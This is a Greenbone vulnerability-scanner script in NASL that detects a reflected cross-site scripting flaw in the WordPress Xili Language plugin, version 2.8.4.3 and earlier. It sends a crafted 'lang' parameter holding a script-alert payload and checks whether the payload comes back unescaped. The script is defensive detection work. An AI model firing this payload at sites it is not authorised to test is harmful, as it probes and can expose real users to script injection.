# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803600");
  script_version("2023-11-23T05:06:17+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-11-23 05:06:17 +0000 (Thu, 23 Nov 2023)");
  script_tag(name:"creation_date", value:"2013-05-14 12:10:16 +0530 (Tue, 14 May 2013)");
  script_name("WordPress Xili Language Plugin <= 2.8.4.3 XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/xili-language");
  script_xref(name:"URL", value:"https://web.archive.org/web/20130629211451/http://secunia.com/advisories/53364");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/53364");

  script_tag(name:"summary", value:"The WordPress plugin 'Xili Language' is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The input passed via 'lang' parameter to index.php script is not
  properly validated.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"WordPress Xili Language Plugin version 2.8.4.3 and prior.");

  script_tag(name:"solution", value:"Update to version 2.8.5 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/?lang=%22><script>alert(12345)</script>";

# Affected (2.8.4.3):
# <html dir="ltr" lang="\"><script>alert(12345)</script>" class="no-js">
#
# Not affected (2.8.5):
# <html dir="ltr" lang="scriptalert12345script" class="no-js">
#
if(http_vuln_check(port:port, url:url, check_header:TRUE,
   # nb: As we need to use single quotes below we had to escape the slash multiple times
   pattern:' lang="\\\\"><script>alert\\(12345\\)</script>"')) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
